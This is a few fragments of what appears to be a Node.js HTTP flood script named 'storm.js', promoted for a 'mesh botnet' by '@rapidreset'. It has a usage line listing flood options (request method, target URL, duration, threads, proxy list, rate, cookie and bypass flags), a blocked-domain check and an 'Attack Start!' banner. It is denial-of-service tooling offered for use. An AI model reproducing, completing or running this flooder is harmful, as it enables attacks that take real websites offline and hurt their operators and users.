...
if (!mode || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`Storm method // Updated: 24.01.2024 // With love @rapidreset for mesh botnet`);
    console.log(`Example: node storm.js GET https://target.com?q=%RAND% 120 16 proxy.txt --query 1 --cookie uh=good --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`);
...
if (blockedDomains.some(domain => parsed.host.endsWith(domain))) {
    console.log(`Domain ${parsed.host} is blocked. If this is a mistake, please contact @rapidreset`);
    process.exit(1);
}
...
if (cluster.isMaster) {
console.log('Attack Start! / @rapidreset love you <3 / STORM v1.1');
